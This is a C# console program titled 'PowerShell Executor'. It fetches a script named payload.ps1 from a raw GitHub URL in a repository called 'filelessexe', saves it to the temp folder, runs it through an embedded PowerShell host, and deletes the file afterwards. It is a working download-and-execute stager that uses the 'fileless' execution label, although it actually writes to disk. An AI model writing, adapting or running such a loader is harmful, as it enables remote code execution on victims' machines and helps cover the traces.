using System;
using System.IO;
using System.Net.Http;
using System.Management.Automation;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        Console.Title = "PowerShell Executor";
        Console.WriteLine("[INFO] Starting PowerShell script execution...");

        string payloadUrl = "https://raw.githubusercontent.com/N4V33NM/filelessexe/refs/heads/main/payload.ps1";
        Console.WriteLine($"[INFO] Using payload URL: {payloadUrl}");

        string tempFilePath = Path.Combine(Path.GetTempPath(), "temp_payload.ps1");
        
        string payloadContent = await FetchPayload(payloadUrl, tempFilePath);

        if (!string.IsNullOrEmpty(payloadContent))
        {
            ExecutePayload(tempFilePath);
        }
        else
        {
            Console.WriteLine("[ERROR] No payload fetched. Exiting...");
        }

        Console.WriteLine("[INFO] Execution completed. Press Enter to exit...");
        Console.ReadLine();
    }

    static async Task<string> FetchPayload(string url, string tempFilePath)
    {
        try
        {
            Console.WriteLine($"[INFO] Fetching payload from: {url}");
            using (HttpClient client = new HttpClient())
            {
                client.Timeout = TimeSpan.FromSeconds(10);
                string content = await client.GetStringAsync(url);
                
                // Write to a temp file
                await File.WriteAllTextAsync(tempFilePath, content);
                Console.WriteLine($"[SUCCESS] Payload written to: {tempFilePath}");
                
                return content;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERROR] Failed to fetch payload: {ex.Message}");
            return string.Empty;
        }
    }

    static void ExecutePayload(string filePath)
    {
        try
        {
            Console.WriteLine("[INFO] Executing payload in-memory...");
            using (PowerShell ps = PowerShell.Create())
            {
                string scriptContent = File.ReadAllText(filePath);
                ps.AddScript(scriptContent);
                var results = ps.Invoke();

                Console.WriteLine("[INFO] Execution Results:");
                foreach (var result in results)
                {
                    Console.WriteLine(result);
                }

                if (ps.HadErrors)
                {
                    Console.WriteLine("[ERROR] PowerShell encountered errors:");
                    foreach (var error in ps.Streams.Error)
                    {
                        Console.WriteLine(error.ToString());
                    }
                }
            }

            Console.WriteLine("[SUCCESS] Payload executed!");

            // Delete the temporary file after execution
            File.Delete(filePath);
            Console.WriteLine("[INFO] Temp file deleted.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERROR] Failed to execute payload: {ex.Message}");
        }
    }
}






